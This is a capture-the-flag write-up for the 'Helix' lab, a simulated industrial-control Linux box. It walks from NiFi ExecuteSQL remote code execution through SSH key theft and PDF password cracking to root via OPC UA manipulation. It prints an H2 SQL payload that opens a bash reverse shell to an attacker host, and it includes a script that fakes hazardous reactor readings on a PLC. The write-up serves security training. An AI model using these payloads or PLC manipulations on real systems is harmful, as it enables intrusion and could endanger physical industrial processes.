# HTB Write-up: Helix
**OS:** Linux  
**Difficulty:** Medium

---

## 1. Executive Summary

**Helix** is a lab that simulates a realistic industrial control systems (ICS/SCADA) environment. The intrusion path begins with remote code execution through the `ExecuteSQL` functionality in an Apache NiFi data flow. After gaining initial access, the attacker must inspect backup artifacts (support bundles) to recover an SSH key and move laterally to the `operator` account. The final stage requires cracking an internal PDF document, setting up SSH tunneling, and writing a script that interacts directly with OPC UA to manipulate the PLC and trigger a maintenance state, ultimately leading to root access.

- **Target IP:** `[TARGET_IP]`
- **Attacker IP:** `[ATTACKER_IP]`

---

## 2. Reconnaissance

### 2.1 Nmap Port Scanning

I started by scanning the target for open ports and services:

```bash
nmap -p- -sV -sC -T4 [TARGET_IP]
```

**The scan revealed:**

- **22/tcp** — OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
- **80/tcp** — Nginx HTTP
- **8080/tcp** — Apache NiFi

During virtual host enumeration, I identified `flow.helix.htb` as a host pointing to the NiFi management interface. I added the hostname to `/etc/hosts` and accessed it through the browser.

---

## 3. Initial Access

### 3.1 Apache NiFi 1.21.0 Analysis

Visiting `http://flow.helix.htb:8080/nifi` exposed a NiFi instance that allowed the creation of controller services and processors. This represented a serious misconfiguration.

The goal was to abuse the `ExecuteSQL` processor for remote code execution. NiFi supports multiple database backends. On the target, an H2 Database JAR was present at `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`. H2 is known for supporting Java aliases that can be abused to run arbitrary Java code.

### 3.2 Exploiting ExecuteSQL via H2

**Step 1: Configure the controller service**

I created a `DBCPConnectionPool` controller service with the following properties:

- **Database Connection URL:** `jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3`
- **Database Driver Class Name:** `org.h2.Driver`
- **Database Driver Location:** `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`

**Step 2: Build the payload**

I created an `rce.sql` file on my machine and hosted it with a Python HTTP server:

```bash
python3 -m http.server 8000
```

Example SQL payload:

```sql
CREATE ALIAS IF NOT EXISTS PWN EXEC AS $$
String pwn(String cmd) throws java.io.IOException {
    Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", cmd});
    return "pwned";
}
$$;
CALL PWN('bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"');
```

**Step 3: Trigger execution**

I created an `ExecuteSQL` processor, pointed it at the controller service, and used the following query to load the remote SQL file:

```sql
RUNSCRIPT FROM 'http://[ATTACKER_IP]:8000/rce.sql'
```

After starting a Netcat listener with `nc -lvnp 4444`, the processor was started and a shell was obtained as the `nifi` user.

---

## 4. Lateral Movement

### 4.1 Support Bundle Review

The `nifi` user is a restricted service account with limited privileges. I enumerated the NiFi installation directory at `/opt/nifi-1.21.0/`.

The `support-bundles` directory was especially interesting because NiFi uses it for diagnostics and packaging logs/configuration. In many real environments, sensitive data can accidentally be included there.

```bash
nifi@helix:/opt/nifi-1.21.0/support-bundles$ ls -la
```

I found a backup private key file named `operator_id_ed25519.bak`, which belonged to the `operator` user. I copied the file for offline review.

### 4.2 Accessing the Operator Account

Using the recovered SSH key, I authenticated as `operator`:

```bash
chmod 600 id_ed25519_operator
ssh -i id_ed25519_operator operator@[TARGET_IP]
```

This granted access to the `operator` account and allowed me to capture the user flag.

**User Flag:** `[REDACTED]`

---

## 5. Privilege Escalation

### 5.1 Reviewing ICS Documentation

Inside the operator home directory, I found two important files:

- `control systems diagram.png` — a diagram of reactor sensors and control components
- `Operator Control & Safety Guide.pdf` — a password-protected operational manual

I transferred both files to my Kali machine for analysis.

I then attempted to recover the PDF password using John the Ripper:

```bash
pdf2john 'Operator Control & Safety Guide.pdf' > pdf_hash.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
```

The password was recovered as `operator1`.

After opening the PDF, I discovered that the privileged maintenance window could be triggered when the PLC observed simulated hazardous conditions over OPC UA.

The relevant conditions were:

- Temperature `>= 295°C`
- Pressure `>= 73 bar`
- Mode set to `MAINTENANCE`

### 5.2 Internal Network Reconnaissance

Using `ss -tulpn` on the target, I found two services bound to localhost:

- **8081** — Web-based HMI for the reactor
- **4840** — OPC UA service

Running `sudo -l` showed that `operator` could execute `/usr/local/sbin/helix-maint-console` without a password. However, the maintenance window was still closed at this stage.

### 5.3 OPC UA Interaction Through SSH Tunneling

Because port 4840 was not publicly exposed and the required Python library was not available on the target, I used SSH port forwarding:

```bash
ssh -L 4840:127.0.0.1:4840 operator@[TARGET_IP] -i id_ed25519_operator
```

I then used a Python script with the `opcua` library to enumerate and modify the relevant nodes. The structure showed variables under the `Reactor` and `Control` nodes.

**Example script (`root_exploit.py`):**

```python
from opcua import Client
import time

url = "opc.tcp://127.0.0.1:4840/helix/"
client = Client(url)

try:
    client.connect()
    print("[+] Connected to OPC UA via tunnel")

    nodes = {}
    for parent_id in ["ns=2;i=2", "ns=2;i=11"]:
        for child in client.get_node(parent_id).get_children():
            nodes[child.get_browse_name().Name] = child

    nodes["Mode"].set_value("MAINTENANCE")
    nodes["TestOverride"].set_value(True)
    nodes["CalibrationOffset"].set_value(20.0)

    print("[+] Payload injected. Hazardous condition simulated!")
    time.sleep(5)

finally:
    client.disconnect()
```

### 5.4 Final Privilege Escalation

After running the script, the reactor temperature on the HMI rose to **301.4°C**. I rechecked the local web interface at `http://127.0.0.1:8081`, and the `Privileged Maintenance Window` state changed to **OPEN**.

At that point, the privileged maintenance console could be executed through sudo:

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

This resulted in full root compromise.

**Root Flag:** `[REDACTED]`

---
